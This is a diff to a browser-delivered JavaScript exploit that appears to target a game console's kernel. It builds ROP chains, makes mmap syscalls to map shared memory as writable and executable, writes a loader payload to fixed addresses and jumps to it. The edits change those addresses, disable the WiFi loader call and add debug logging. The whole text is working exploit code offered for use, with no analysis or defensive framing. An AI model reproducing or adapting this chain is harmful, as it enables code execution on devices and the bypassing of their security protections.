@@ -16,6 +16,7 @@ function load() {
 	document.getElementById("environment").innerHTML = getEnvironmentInfo();
 	exploit();
 	chain = new rop();
+	logAdd("ropped");
 	
 	var codeExecutionStage = getCookie("codeExecutionStage");
 	if(codeExecutionStage == "1") {
@@ -45,7 +46,9 @@ function load() {
 		setTimeout(function() { document.cookie = "codeExecutionStage=0"; location.reload(); }, 10);
 	}
 }
-var SECTIONSIZE = 1024 * 1024;
+//var SECTIONSIZE = 1024 * 1024;
+var SECTIONSIZE = 0x100000;
+
 function cleanSessionVars() {
 	sessionStorage.executableHandle = null;
 	sessionStorage.writableHandle = null;
@@ -68,7 +71,7 @@ function allocateSharedMemory2() {
 	var executableHandle = JSON.parse(sessionStorage.executableHandle || "{}");
 
 	chain.call("createSharedMemoryAlias", LIBKERNEL, 0x196B0, executableHandle, 1 | 2, chain.data);
-	chain.syscall("mmap", 477, 0x914800000, SECTIONSIZE * 2, 1 | 2, 4096, -1, 0);
+	chain.syscall("mmap", 477, 0x913600000, SECTIONSIZE * 2, 1 | 2, 4096, -1, 0);
 	chain.write_rax_ToVariable(0);
 	
 	chain.execute(function() {
@@ -89,8 +92,8 @@ function mapSharedMemory() {
 	var executableHandle = JSON.parse(sessionStorage.executableHandle || "{}");
 	var writableHandle = JSON.parse(sessionStorage.writableHandle || "{}");
 
-	chain.call("mapSharedMemory", LIBKERNEL, 0x19700, writableHandle, 1 | 2, chain.data);
-	chain.syscall("mmap", 477, 0x914800000 + SECTIONSIZE, SECTIONSIZE, 1 | 4, 1, executableHandle, 0); //0x914800000
+	//chain.call("mapSharedMemory", LIBKERNEL, 0x19700, writableHandle, 1 | 2, chain.data);
+	chain.syscall("mmap", 477, 0x913400000 + SECTIONSIZE, SECTIONSIZE, 1 | 4, 1, executableHandle, 0); //0x914800000
 	chain.write_rax_ToVariable(0);
 	
 	chain.execute(function() {
@@ -105,8 +108,8 @@ function mapSharedMemory() {
 }
 
 function payload() {
-	var writeAddress = 0x91a100000;
-	var executeAddress = 0x91a200000;
+	var writeAddress = 0x913400000;
+	var executeAddress = 0x913500000;
 	
 	// infinite loop
 	//setU32to(writeAddress, 0xfeeb);
@@ -122,7 +125,7 @@ function payload() {
 	//if(sessionStorage.loadlinux == 1)
 	//	writeLinux(writeAddress) // Linux-loader
 	//else
-		writeLoader(writeAddress); // WiFi-Loader
+		//writeLoader(writeAddress); // WiFi-Loader
 	
 	chain.start(executeAddress);
 	chain.write_rax_ToVariable(0);
@@ -134,9 +137,9 @@ function payload() {
 	});
 }
 function copy() {
-	var writeAddress = 0x91a100000;
-	var executeAddress = 0x91a200000;
-	var dataAddress = 0x91a300000;
+	var writeAddress = 0x913400000;
+	var executeAddress = 0x913500000;
+	var dataAddress = 0x913600000;
 	
 	// Copy code
 	var c = [];
@@ -503,6 +506,12 @@ function socketSend() {
 	chain.execute(function() {
 		logAdd("\"" + socketMessage + "\" sent to " + hostAddr + ":" + hostPort);
 	});
+	
+	var b = stack_base;
+	//setBase(b);
+	//logAdd(hexDump(b, 0xa000));
+		
+					
 }
 function launchLinux() {
 	cleanSessionVars();
